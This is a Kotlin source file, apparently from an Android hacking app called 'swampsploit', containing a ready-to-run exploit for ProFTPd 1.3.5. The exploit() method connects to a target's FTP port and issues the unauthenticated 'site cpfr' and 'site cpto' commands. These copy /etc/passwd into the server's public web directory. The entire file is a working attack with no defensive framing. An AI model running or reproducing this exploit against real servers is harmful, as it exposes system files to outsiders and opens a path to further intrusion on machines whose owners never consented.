package me.smoothhacker.swampsploit.exploit

import android.util.Log
import java.io.PrintWriter
import java.net.InetSocketAddress
import java.net.Socket

class ProFTP constructor(
    private val address: String
) {
    fun exploit() {
        val timeout = 5000 // ms

        val client = Socket()
        client.connect(InetSocketAddress(address, 21), timeout)

        client.soTimeout = 1000

        val input = client.getInputStream()
        val reader = input.bufferedReader()
        val writer = PrintWriter(client.getOutputStream(), true)

        Log.w("ProFTPd 1.3.5", reader.readLine())
        writer.println("site cpfr /etc/passwd")

        Log.w("ProFTPd 1.3.5", reader.readLine())
        writer.println("site cpto /var/www/html/test.php")

        Log.w("ProFTPd 1.3.5", reader.readLine())
        client.close()
    }
}
